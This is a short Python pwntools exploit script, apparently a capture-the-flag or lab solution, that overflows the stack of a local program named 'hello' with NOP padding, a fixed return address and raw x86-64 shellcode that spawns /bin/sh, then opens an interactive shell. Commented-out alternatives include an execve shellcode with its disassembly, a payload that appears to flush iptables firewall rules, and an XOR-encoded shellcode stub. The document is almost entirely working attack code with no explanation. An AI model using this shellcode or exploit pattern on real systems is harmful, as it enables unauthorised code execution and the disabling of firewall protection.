
from pwn import *
import time

#--[ asm
#6a 42                   push   0x42
#58                      pop    rax
#fe c4                   inc    ah
#48 99                   cqo
#52                      push   rdx
#48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
#2f 73 68
#57                      push   rdi
#54                      push   rsp
#5e                      pop    rsi
#49 89 d0                mov    r8, rdx
#49 89 d2                mov    r10, rdx
#0f 05                   syscall

context.arch = "amd64"


#shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" 
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#shellcode = b"\x48\x31\xc0\x50\x66\x68\x2d\x46\x48\x89\xe1\x48\xbb\xff\xff\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73\x62\x69\x2f\x69\x70\x53\x48\x89\xe7\x50\x51\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

#shellcode = b"\x4d\x31\xc0\x41\xb1\x7f\xeb\x1a\x58\x48\x31\xc9\x48\x31\xdb\x8a\x1c\x08\x4c\x39\xc3\x74\x10\x44\x30\xcb\x88\x1c\x08\x48\xff\xc1\xeb\xed\xe8\xe1\xff\xff\xff\x37\x4e\xbf\x37\xfc\xbf\x0e\x37\x4e\x80\x37\x4e\x89\x70\x7a\x94\x6f\x37\x4e\xbf\x37\xfc\xbf\x44\x20\x37\x4e\x89\x37\x4e\xad\x70\x7a\x97\x94\x80\x80\x80\x50\x1d\x16\x11\x50\x1e\x0c\x17"

evil = b"\x90"*104 + p64(0x000000000040118C) + shellcode

print(evil)

binary = process("./hello")

binary.sendline(evil)
binary.interactive()






